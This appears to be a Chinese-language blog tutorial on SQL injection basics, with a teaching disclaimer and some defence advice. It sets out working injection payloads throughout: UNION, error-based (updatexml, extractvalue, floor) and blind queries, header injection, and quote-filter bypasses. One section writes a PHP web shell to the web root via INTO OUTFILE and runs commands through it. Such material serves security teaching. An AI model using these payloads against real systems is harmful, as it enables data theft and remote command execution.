---
title: 【SQL注入】SQL注入基础
categories:
  - 渗透测试
  - SQL注入
tags:
  - private
description: >-
  声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。
comments: true
abbrlink: a4455eb
date: 2025-07-28 06:57:29
top:
---



### 一、学习 SQL 注入的目的

理解测试关键点所在，掌握如何构造闭合，能够猜想后端 SQL 语句的拼接方式，进而构造合法 SQL 语句去欺骗后台数据库。

### 二、SQL 注入常见类型及原理

#### （一）数字型注入

**正常查询示例**：`select 字段1，字段2 from 表名字 where id =1`。

**攻击**：`1 OR 1=1 --`

**非正常查询示例**：`select 字段1，字段2 from 表名字 where id =1 or 1=1;`（通过拼接语句，利用 `or 1=1` 这种永远为真的条件来进行注入，因为 `1=1` 恒成立，改变了原本正常的查询逻辑）。

#### （二）字符型注入

**正常查询示例**：`Select 字段1，字段2 from 表名字 where username=“kobe”;`

**攻击**：`kobe' OR '1'='1` → `...user='kobe' OR '1'='1'`

**注入要点**：直接使用 `or 2=2` 不行，因为输入内容都会变为字符串，比如 `select id,email from member where username="kobe or 1=1";` 就需要进行合适的闭合操作，按照后端处理逻辑来构造注入语句。

#### （三）搜索型注入

**正常查询示例**：`select * from member where username like '%k%'`（进行模糊匹配查询包含特定字符的数据）。

**攻击**：`%' AND 1=0 UNION SELECT @@version -- `

**注入思路**：用 `%'` 截断LIKE子句

#### （四）XX 型注入

示例如 `') or 1=1#` （采用单引号加括号的形式进行构造，通过合理闭合等操作来欺骗后端执行注入语句）。

### 三、判断是否存在 SQL 注入的方法

**利用逻辑判断语句**：像 `and 1=1` 能参与数据库运行，如果 `Kobe’ and 1=1` 输出正常，`Kobe' and 1=2` 输出结果为空（因为 `1=2` 为假语句），可据此判断是否存在注入，说明拼接的语句能在数据库运行，若出现不符合预期的结果差异，就可能存在注入情况。
**利用符号判断**：若拼接符号进去数据库并运行了，即便报了语法错误，也能说明存在注入情况。

### 四、常用的 SQL 注入获取信息及报错注入方式

#### （一）Union 联合查询

语句格式如 ：

```mysql
Select username，password from user where id=1 union select 字段1，字段2 from 表名字
```

（要求后面查询的字段要跟主查询一致，若能查到信息则证明存在可利用的注入点），例如 `a' union select version(),user()#` 可以获取相关数据库信息。

#### （二）函数报错注入

+ **updatexml（）函数报错注入**：像 `kobe' and updatexml(1,concat(0x7e,version()),0)#` 等语句，`updatexml` 函数第一个参数指定相关表名称情况，第二个参数 `concat` 用于拼接数据库内容（把 `0x7e` 和 `version` 等拼成字符串，`0x7e` 即 `~` 参数，是为避免信息不被报错内容覆盖，以拼接出完整信息），第三个参数在第一个参数不存在对应表时无实际意义，主要是利用其报错来获取信息。

- **Extractvalue（）报错注入**：作用是从目标 XML 中返回包含的值字符串，使用时需要闭合，例如 `' and extractvalue(0,concat(0x7e,version()))#`。
- **floor（）报错注入**：原因是 `group by` 在向临时表插入数据时，由于 `rand()` 多次计算导致插入临时表时主键重复，从而报错，又因为报错前 `concat()` 中的 SQL 语句或函数被执行，所以该语句报错且被抛出的主键是 SQL 语句或函数执行后的结果，示例语句如：

  ```mysql
  Kobe' and (select 2 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)#
  ```

   （涉及 `count(*)` 函数统计表内容条数、`group by` 语句分组以及 `rand(x)` 函数生成伪随机数等操作来构造注入语句）。

### 五、不同操作场景下的 SQL 注入

#### （一）Insert/update 注入

**原理**：前端提交到后台会通过 `insert` 插入数据库，若注册提交等时候没有做防 SQL 注入处理，前端提交语句就会拼接到数据库并执行。例如插入语句 `insert into member(username,pw,sex,phonenum,email,address) value('haha'or updatexml(1,concat(0x7e,database()),0) or'',11111,1,2,3,4);` ，通过 `or` 进行闭合操作，第一个 `or` 进行运算（执行 `updatexml` 函数内容），第二个 `or` 用来闭合语句。
**测试方法**：提交符号测试，若出现语法错误，说明参与了 SQL 的拼接，导致 MySQL 语法报错。

#### （二）Delete 注入

**特点**：针对根据 `id` 删除的操作（`id` 是数字型的），后台代码若直接拼接进去了且没做处理，就可能存在注入漏洞，如 `1 or updatexml(1,concat(0x7e,database()),0)` ，数字型的 `id` 不需要闭合处理，若是 `Get` 请求需要进行 URL 编码处理再提交，若能成功注入会有相应结果显示。

#### （三）http 头部注入

**原理**：后端验证客户端头部信息（如 `cookie` 等），会对客户端 `http header` 信息使用 SQL 处理，例如在 `User-Agent` 处注入 `User-Agent: ' or updatexml(1,concat(0x7e,database()),0) or '` ，或者在 `Cookie` 处拼接 `'and updatexml(1,concat(0x7e,database()),0)#` ，若出现报错即证明存在 SQL 注入漏洞。

### 六、盲注相关知识

#### （一）真假盲注

**特点**：屏蔽报错，结果只有 0 和 1（代表真和假），需要通过不断用真和假来猜测数据库相关信息，比较耗费时间。

- 示例猜解方式：

**猜解数据库长度**：如 `Kobe' and length(database())>5#` 。

**猜解数据库字符**：`Kobe’and ascii(substr(database(),1,1))>113#` （利用用户名本身存在为真，后面代码猜错则为假的逻辑来逐步猜解数据库内容）。

#### （二）时间型盲注

- **原理**：通过让数据库操作暂停一定时间（如暂停 5 秒再返回前端）来判断是否存在注入，例如 `kobe' and if((substr(database(),1,1))='p',sleep(5),null)#` （利用 `if` 做判断，通过 `substr` 引出数据库字符，跟指定字符串比较，符合条件则暂停，不符合则返回 `null`，以此判断注入情况）。

### 七、宽字节注入

**目的及原理**：用于突破一些限制，是在转义输出之前插入 16 进制字节，因为 `Ascii` 码范围是 0 - 128，大于 128 才能到汉字范围，插入一个大于 128 的字节，让 SQL 误认为是一体的，前提是后端使用 `gbk` 编码（市场上多数采用 `utf-8` 编码，需要注意区分），例如 `%df’` 可用来闭合转义（传到后端是一个繁体字 “运”），`%23` 就是 `#` 的 URL 编码形式。

总之，SQL 注入是个需要深入理解和防范的安全问题，在实际应用中，对于有输入框等可能接收用户输入的地方，都要警惕是否存在 SQL 注入漏洞，做好相应的安全防护措施。

## 利用 SQL 注入写入一句话木马技术解析

**核心原理**
通过数据库`into outfile`将恶意 PHP 代码写入 Web 目录，结合 SQL 注入漏洞实现远程命令执行。需满足三个条件：

1. 已知 Web 目录路径（如`D:/phpStudy/WWW`）
2. 目标目录有写权限
3. 数据库`secure_file_priv`参数允许写入（需设置为空值）

**操作步骤**

1. **环境准备**

   - 修改数据库配置文件（如`my.ini`）添加：

     ```ini
     secure_file_priv=
     ```

   - 重启数据库服务，验证配置生效：

     ```sql
     SHOW VARIABLES LIKE 'secure_file_priv'; -- 应显示空值
     ```

2. **注入攻击**
   构造 SQL 注入语句写入木马：

   ```sql
   ' UNION SELECT "<?php system($_GET[\'cmd\']);?>",2 INTO OUTFILE "D:/phpStudy/WWW/shell.php" --
   ```

3. **验证权限**
   访问木马文件执行系统命令：

   ```http
   http://目标IP/shell.php?cmd=whoami
   ```

**防御建议**

- 禁用数据库文件写入功能（设置`secure_file_priv=NULL`）
- 严格限制 Web 目录写权限
- 对用户输入进行 SQL 转义过滤
- 定期审计数据库配置与 Web 文件



## SQLi绕过



#### **绕过单引号过滤**

这是字符串拼接在注入中的**核心用途之一**。当应用程序过滤了单引号时，你可以用`CHAR()`或`CHR()`函数（将ASCII码转换为字符）配合字符串拼接来重新生成所需的字符串。

**通用方法（MySQL/MSSQL/PostgreSQL）**：

```
AND user = CHAR(97, 100, 109, 105, 110) -- 生成 'admin'
```

**Oracle/PostgreSQL方法**：

```
AND user = CHR(97) || CHR(100) || CHR(109) || CHR(105) || CHR(110) -- 生成 'admin'
```



















本文参考：
